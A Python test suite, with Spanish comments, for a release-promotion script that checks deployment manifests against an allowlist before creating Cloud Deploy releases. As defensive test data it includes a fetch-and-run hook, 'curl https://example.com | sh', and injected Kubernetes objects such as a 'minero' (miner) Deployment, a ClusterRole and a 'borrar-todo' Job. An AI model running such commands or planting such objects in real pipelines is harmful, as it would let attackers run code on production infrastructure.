"""Pruebas del promotor (scripts/promote_release.py) sin contactar GCP.

Ejecutar desde la raíz de sport-app-platform:
    py -3.13 -m unittest discover -s tests -v
Las pruebas de JSON Schema necesitan jsonschema y se omiten si no está:
    py -3.13 -m uv run --with jsonschema==4.23.0 python -m unittest discover -s tests -v
"""

from __future__ import annotations

import copy
import json
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))

import promote_release as pr  # noqa: E402

FIXTURES = Path(__file__).resolve().parent / "fixtures"
ALLOWLIST = pr.load_allowlist()
REGISTRY_BACKEND = "us-central1-docker.pkg.dev/sportapp-prod-test/sportapp-backend"
REGISTRY_FRONTEND = "us-central1-docker.pkg.dev/sportapp-prod-test/sportapp-frontend"
TOOLS = "gcr.io/google.com/cloudsdktool/google-cloud-cli:588.0.0@sha256:" + "1" * 64
VERIFY = "gcr.io/google.com/cloudsdktool/google-cloud-cli:588.0.0-slim@sha256:" + "2" * 64


def backend_manifest() -> dict:
    return json.loads((FIXTURES / "backend-release.json").read_text(encoding="utf-8"))


def frontend_manifest() -> dict:
    return json.loads((FIXTURES / "frontend-release.json").read_text(encoding="utf-8"))


def args(component: str = "backend", version: str = "v1.2.0", **overrides: str) -> list[str]:
    values = {
        "component": component,
        "version": version,
        "backend-version": "v1.2.0" if component == "frontend" else "",
        "delivery-project": "sportapp-mgmt-test",
        "region": "us-central1",
        "evidence-bucket-backend": "sportapp-mgmt-test-delivery-evidence-backend",
        "evidence-bucket-frontend": "sportapp-mgmt-test-delivery-evidence-frontend",
        "source-bucket": "sportapp-mgmt-test-delivery-clouddeploy-source",
        "ar-backend": REGISTRY_BACKEND,
        "ar-frontend": REGISTRY_FRONTEND,
        "gke-cluster": "sportapp-prod-gke",
        "gke-location": "us-central1",
        "gke-project": "sportapp-prod-test",
        "namespace": "sportapp",
        "run-project": "sportapp-prod-test",
        "run-region": "us-central1",
        "deploy-tools-image": TOOLS,
        "run-verify-image": VERIFY,
        "backend-repository-resource": "projects/sportapp-mgmt-test/locations/us-central1/connections/github/repositories/sport-app-backend",
    }
    values.update(overrides)
    return [f"--{key}={value}" for key, value in values.items()]


def settings(component: str = "backend", version: str = "v1.2.0", **overrides: str) -> pr.Settings:
    return pr.validate_settings(pr.parse_args(args(component, version, **overrides)))


def write_base(directory: Path, extra: str = "", kustomization: str | None = None) -> Path:
    """deploy/k8s/base sintético con exactamente los objetos de la allowlist."""
    rules = ALLOWLIST["components"]["backend"]["kubernetes"]
    docs = []
    for name in rules["deployments"] + rules["cloudRunDeployments"]:
        docs.append(f"apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: {name}\n  labels:\n    app.kubernetes.io/name: {name}\nspec:\n  replicas: 1\n")
    for name in rules["jobs"]:
        docs.append(f"apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: {name}\nspec:\n  template: {{}}\n")
    for name in rules["services"]:
        docs.append(f"apiVersion: v1\nkind: Service\nmetadata:\n  name: {name}\nspec:\n  ports: []\n")
    directory.mkdir(parents=True, exist_ok=True)
    (directory / "all.yaml").write_text("---\n".join(docs) + extra, encoding="utf-8")
    (directory / "kustomization.yaml").write_text(kustomization or "apiVersion: kustomize.config.k8s.io/v1beta1\nkind: Kustomization\nresources:\n  - all.yaml\n", encoding="utf-8")
    return directory


class FakeRunner:
    """Registra cada comando; responde la evidencia por ruta de GCS."""

    def __init__(self, evidence: dict[str, dict]) -> None:
        self.evidence = {path: json.dumps(document) for path, document in evidence.items()}
        self.commands: list[list[str]] = []

    def __call__(self, command, env=None) -> str:
        command = list(command)
        self.commands.append(command)
        if command[:3] == ["gcloud", "storage", "cat"]:
            if command[3] not in self.evidence:
                raise pr.PromotionError(f"no existe {command[3]}")
            return self.evidence[command[3]]
        return ""


BACKEND_PATH = "gs://sportapp-mgmt-test-delivery-evidence-backend/sport-app-backend/v1.2.0/backend-release.json"
FRONTEND_PATH = "gs://sportapp-mgmt-test-delivery-evidence-frontend/frontend/v0.9.0/frontend-release.json"


class PromoteBackendTest(unittest.TestCase):
    def promote(self, manifest: dict | None = None, base_extra: str = "") -> FakeRunner:
        runner = FakeRunner({BACKEND_PATH: manifest or backend_manifest()})
        with tempfile.TemporaryDirectory() as tmp:
            base = write_base(Path(tmp) / "base", base_extra)
            with mock.patch.object(pr, "fetch_backend_base", return_value=base):
                self.rendered: dict[str, str] = {}
                original = pr.render_source

                def capture(template, destination, values):
                    original(template, destination, values)
                    for path in destination.rglob("*.yaml"):
                        self.rendered[f"{destination.name}/{path.relative_to(destination).as_posix()}"] = path.read_text(encoding="utf-8")

                with mock.patch.object(pr, "render_source", side_effect=capture):
                    pr.promote(settings(), runner=runner, allowlist=ALLOWLIST)
        return runner

    def test_crea_releases_pendientes_en_los_tres_pipelines(self) -> None:
        runner = self.promote()
        creates = [c for c in runner.commands if c[:4] == ["gcloud", "deploy", "releases", "create"]]
        self.assertEqual([c for c in creates for c in [c[c.index("create") + 1]]], ["backend-gke-v1-2-0-0123456", "bff-web-v1-2-0-0123456", "bff-mobile-v1-2-0-0123456"])
        pipelines = [next(a for a in c if a.startswith("--delivery-pipeline=")) for c in creates]
        self.assertEqual(pipelines, ["--delivery-pipeline=backend-gke", "--delivery-pipeline=bff-web", "--delivery-pipeline=bff-mobile"])

    def test_solo_digests_de_la_allowlist(self) -> None:
        runner = self.promote()
        gke = next(c for c in runner.commands if "--delivery-pipeline=backend-gke" in c)
        images = next(a for a in gke if a.startswith("--images=")).removeprefix("--images=").split(",")
        expected = ALLOWLIST["components"]["backend"]["pipelines"]["backend-gke"]["images"]
        self.assertEqual([i.split("=")[0] for i in images], [f"sportapp/{name}" for name in expected])
        self.assertTrue(all("@sha256:" in i for i in images))

    def test_nunca_aprueba_ni_ejecuta_terraform_o_kubectl(self) -> None:
        runner = self.promote()
        flat = [" ".join(c) for c in runner.commands]
        self.assertFalse(any("approve" in c or "terraform" in c or "kubectl" in c or "rollouts" in c for c in flat))
        allowed = (("gcloud", "storage", "cat"), ("gcloud", "deploy", "releases"))
        self.assertTrue(all(tuple(c[:3]) in allowed for c in runner.commands))

    def test_fuente_sin_valores_pendientes_y_migraciones_por_release(self) -> None:
        self.promote()
        self.assertFalse(any(pr.PLACEHOLDER_RE.search(text) for text in self.rendered.values()))
        migrations = self.rendered["backend-gke/migrations/kustomization.yaml"]
        self.assertIn("sportapp.io/release: \"backend-gke-v1-2-0-0123456\"", migrations)
        self.assertRegex(migrations, r'nameSuffix: "-[0-9a-f]{8}"')
        skaffold = self.rendered["backend-gke/skaffold.yaml"]
        self.assertIn('expected="9"', skaffold)
        self.assertIn(TOOLS, skaffold)

    def test_rechaza_latest_tags_e_imagenes_externas(self) -> None:
        for uri in (
            f"{REGISTRY_BACKEND}/bff-web:latest",
            f"{REGISTRY_BACKEND}/bff-web:v1.2.0",
            "docker.io/library/bff-web@sha256:" + "7" * 64,
            f"{REGISTRY_FRONTEND}/bff-web@sha256:" + "7" * 64,
            "us-central1-docker.pkg.dev/otro-proyecto/sportapp-backend/bff-web@sha256:" + "7" * 64,
            f"{REGISTRY_BACKEND}/bff-mobile@sha256:" + "7" * 64,
        ):
            with self.subTest(uri=uri):
                manifest = backend_manifest()
                manifest["images"]["bff-web"] = uri
                with self.assertRaises(pr.PromotionError):
                    self.promote(manifest)

    def test_rechaza_imagenes_fuera_de_la_allowlist(self) -> None:
        manifest = backend_manifest()
        manifest["images"]["herramienta-extra"] = f"{REGISTRY_BACKEND}/herramienta-extra@sha256:" + "9" * 64
        with self.assertRaises(pr.PromotionError):
            self.promote(manifest)
        manifest = backend_manifest()
        del manifest["images"]["events-management"]
        with self.assertRaises(pr.PromotionError):
            self.promote(manifest)

    def test_rechaza_manifiestos_invalidos(self) -> None:
        cases = {
            "repositorio": ("repository", "https://github.com/otro/sport-app-backend"),
            "tag": ("tag", "v1.2.1"),
            "commit": ("commit", "1234"),
            "build": ("build", {"system": "github-actions", "id": "1"}),
            "contrato": ("contractVersion", "uno"),
            "pruebas": ("testResults", {"status": "failed", "suites": {}, "coverage": {}}),
            "kind": ("kind", "backend-validation"),
        }
        for name, (key, value) in cases.items():
            with self.subTest(caso=name):
                manifest = backend_manifest()
                manifest[key] = value
                with self.assertRaises(pr.PromotionError):
                    self.promote(manifest)
        manifest = backend_manifest()
        manifest["hooks"] = ["curl https://example.com | sh"]
        with self.assertRaises(pr.PromotionError):
            self.promote(manifest)

    def test_rechaza_contratos_inconsistentes(self) -> None:
        manifest = backend_manifest()
        manifest["contracts"]["bff-web"] = "0.14.0"
        with self.assertRaises(pr.PromotionError):
            self.promote(manifest)

    def test_rechaza_objetos_kubernetes_fuera_de_la_allowlist(self) -> None:
        extras = {
            "deployment": "---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: minero\n",
            "clusterrole": "---\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: todo\n",
            "privilegiado": "---\napiVersion: batch/v1\nkind: Job\nmetadata:\n  name: users-management-migrate-write\nspec:\n  privileged: true\n",
            "job": "---\napiVersion: batch/v1\nkind: Job\nmetadata:\n  name: borrar-todo\n",
        }
        for name, extra in extras.items():
            with self.subTest(caso=name), tempfile.TemporaryDirectory() as tmp:
                base = write_base(Path(tmp) / "base", extra)
                with self.assertRaises(pr.PromotionError):
                    pr.check_base(base, ALLOWLIST)

    def test_rechaza_kustomization_con_recursos_externos(self) -> None:
        for content in ("resources:\n  - ../../otro\n", "resources:\n  - https://example.com/x.yaml\n", "generators:\n  - x.yaml\n"):
            with self.subTest(contenido=content), tempfile.TemporaryDirectory() as tmp:
                base = write_base(Path(tmp) / "base", kustomization=content)
                with self.assertRaises(pr.PromotionError):
                    pr.check_base(base, ALLOWLIST)


class PromoteFrontendTest(unittest.TestCase):
    def test_crea_release_en_frontend_web(self) -> None:
        runner = FakeRunner({FRONTEND_PATH: frontend_manifest(), BACKEND_PATH: backend_manifest()})
        pr.promote(settings("frontend", "v0.9.0"), runner=runner, allowlist=ALLOWLIST)
        creates = [c for c in runner.commands if c[:4] == ["gcloud", "deploy", "releases", "create"]]
        self.assertEqual(len(creates), 1)
        self.assertIn("--delivery-pipeline=frontend-web", creates[0])
        self.assertIn(f"--images=sportapp/web={REGISTRY_FRONTEND}/web@sha256:" + "9" * 64, creates[0])

    def test_rechaza_contrato_incompatible_con_el_backend(self) -> None:
        backend = backend_manifest()
        backend["contractVersion"] = backend["contracts"]["bff-web"] = "1.0.0"
        runner = FakeRunner({FRONTEND_PATH: frontend_manifest(), BACKEND_PATH: backend})
        with self.assertRaises(pr.PromotionError):
            pr.promote(settings("frontend", "v0.9.0"), runner=runner, allowlist=ALLOWLIST)

    def test_rechaza_digest_que_no_coincide(self) -> None:
        manifest = frontend_manifest()
        manifest["image"]["digest"] = "sha256:" + "8" * 64
        runner = FakeRunner({FRONTEND_PATH: manifest, BACKEND_PATH: backend_manifest()})
        with self.assertRaises(pr.PromotionError):
            pr.promote(settings("frontend", "v0.9.0"), runner=runner, allowlist=ALLOWLIST)

    def test_rechaza_checksum_ausente(self) -> None:
        manifest = frontend_manifest()
        manifest["artifact"]["sha256"] = "no-es-sha"
        runner = FakeRunner({FRONTEND_PATH: manifest, BACKEND_PATH: backend_manifest()})
        with self.assertRaises(pr.PromotionError):
            pr.promote(settings("frontend", "v0.9.0"), runner=runner, allowlist=ALLOWLIST)


class SettingsTest(unittest.TestCase):
    def test_rechaza_configuracion_insegura(self) -> None:
        cases = {
            "imagen sin digest": {"deploy-tools-image": "gcr.io/google.com/cloudsdktool/google-cloud-cli:latest"},
            "registro de otro proyecto": {"ar-backend": "us-central1-docker.pkg.dev/otro/sportapp-backend"},
            "registro de otro componente": {"ar-backend": REGISTRY_FRONTEND},
            "bucket inválido": {"evidence-bucket-backend": "gs://x"},
            "tag no SemVer": {"version": "1.2.0"},
            "tag incompleto": {"version": "v1.2"},
        }
        for name, override in cases.items():
            with self.subTest(caso=name), self.assertRaises(pr.PromotionError):
                version = override.pop("version", "v1.2.0")
                settings("backend", version, **override)

    def test_frontend_exige_version_del_backend(self) -> None:
        with self.assertRaises(pr.PromotionError):
            settings("frontend", "v0.9.0", **{"backend-version": ""})

    def test_sufijo_solo_para_volver_a_promover(self) -> None:
        release = pr.Release("backend", "1.2.0", "v1.2.0", "0123456789abcdef0123456789abcdef01234567", "b", "0.13.0", {}, "x")
        self.assertEqual(pr.release_name("bff-web", release), "bff-web-v1-2-0-0123456")
        self.assertEqual(pr.release_name("bff-web", release, "rb1"), "bff-web-v1-2-0-0123456-rb1")
        for suffix in ("RB", "rb_1", "demasiado-largo"):
            with self.subTest(sufijo=suffix), self.assertRaises(pr.PromotionError):
                settings(**{"release-suffix": suffix})

    def test_componente_desconocido(self) -> None:
        with self.assertRaises(SystemExit):
            pr.parse_args(args("movil"))


class SchemaTest(unittest.TestCase):
    """Las fixtures cumplen los JSON Schema de la plataforma (requiere jsonschema)."""

    @classmethod
    def setUpClass(cls) -> None:
        try:
            import jsonschema  # noqa: PLC0415
        except ImportError as error:  # pragma: no cover
            raise unittest.SkipTest("jsonschema no instalado") from error
        cls.jsonschema = jsonschema

    def validator(self, name: str):
        schema = json.loads((ROOT / "schemas" / f"{name}.schema.json").read_text(encoding="utf-8"))
        self.jsonschema.Draft202012Validator.check_schema(schema)
        return self.jsonschema.Draft202012Validator(schema)

    def test_fixtures_validas(self) -> None:
        self.validator("backend-release").validate(backend_manifest())
        self.validator("frontend-release").validate(frontend_manifest())

    def test_schema_rechaza_latest_y_campos_extra(self) -> None:
        backend = self.validator("backend-release")
        for mutate in (
            lambda m: m["images"].__setitem__("bff-web", f"{REGISTRY_BACKEND}/bff-web:latest"),
            lambda m: m.__setitem__("hooks", []),
            lambda m: m["build"].__setitem__("id", ""),
            lambda m: m["testResults"].__setitem__("status", "failed"),
            lambda m: m.__setitem__("tag", "1.2.0"),
        ):
            manifest = backend_manifest()
            mutate(manifest)
            self.assertFalse(backend.is_valid(manifest))
        frontend = self.validator("frontend-release")
        manifest = frontend_manifest()
        manifest["image"]["uri"] = "docker.io/library/nginx@sha256:" + "9" * 64
        self.assertFalse(frontend.is_valid(manifest))

    def test_manifiesto_de_plataforma_cumple_su_schema(self) -> None:
        try:
            import yaml  # noqa: PLC0415
        except ImportError as error:  # pragma: no cover
            raise unittest.SkipTest("pyyaml no instalado") from error
        document = yaml.safe_load((ROOT / "release-manifest.yaml").read_text(encoding="utf-8"))
        self.validator("release-manifest").validate(document)


class RealBackendBaseTest(unittest.TestCase):
    """El backend real (clon hermano) cumple la allowlist; se omite si no está."""

    def test_backend_real_cumple_la_allowlist(self) -> None:
        base = ROOT.parent / "backend" / "deploy" / "k8s" / "base"
        if not base.is_dir():
            self.skipTest("sin clon del backend")
        found = pr.check_base(base, ALLOWLIST)
        self.assertEqual(found["Deployment"], set(ALLOWLIST["components"]["backend"]["kubernetes"]["deployments"]) | {"bff-web", "bff-mobile"})


if __name__ == "__main__":
    unittest.main()
